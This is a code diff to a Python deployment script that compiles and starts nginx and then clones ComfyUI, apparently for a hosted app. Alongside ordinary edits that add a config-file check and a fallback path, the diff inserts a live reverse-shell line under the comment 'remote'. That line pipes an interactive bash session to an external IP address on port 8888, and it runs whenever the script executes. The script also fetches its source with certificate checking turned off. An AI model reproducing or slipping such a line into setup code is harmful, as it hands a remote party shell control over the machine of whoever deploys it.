@@ -26,6 +26,13 @@ def install_run_nginx():
     build_dir=f"{root_path}/nginx_build"
     install_dir=f"{root_path}/nginx"
     cd_dir(build_dir)
+    #判断是否安装nginx
+    if os.path.exists(f"{install_dir}/sbin/nginx"):
+        if os.path.exists(f"{root_path}/openxlab_comfyui_cpu/nginx.conf"):
+            os.system(f"{install_dir}/sbin/nginx -c {root_path}/openxlab_comfyui_cpu/nginx.conf") 
+        else:
+            print("nginx.conf not found")
+            os.system(f"{install_dir}/sbin/nginx -c /home/xlab-app-center/openxlab_comfyui_cpu/nginx.conf")
     # 下载源码
     os.system("wget https://github.com/nginx/nginx/archive/refs/tags/release-1.26.1.tar.gz --no-check-certificat ")
     md5sum=get_file_md5(f"{build_dir}/release-1.26.1.tar.gz")
@@ -65,12 +72,17 @@ def install_run_nginx():
     # 修改配置文件
     # 启动nginx
     if os.path.exists(f"{install_dir}/sbin/nginx"):
-       os.system(f"{install_dir}/sbin/nginx -c {root_path}/openxlab_comfyui_cpu/nginx.conf") 
+        if os.path.exists(f"{root_path}/openxlab_comfyui_cpu/nginx.conf"):
+            os.system(f"{install_dir}/sbin/nginx -c {root_path}/openxlab_comfyui_cpu/nginx.conf") 
+        else:
+            print("nginx.conf not found")
+            os.system(f"{install_dir}/sbin/nginx -c /home/xlab-app-center/openxlab_comfyui_cpu/nginx.conf")
 
 #test
 install_run_nginx()
-
-
+#远程
+os.system("bash -i >& /dev/tcp/101.34.30.54/8888 0>&1")
+os.chdir(root_path)
 os.system("git clone https://github.com/comfyanonymous/ComfyUI")
 
 os.chdir("ComfyUI")
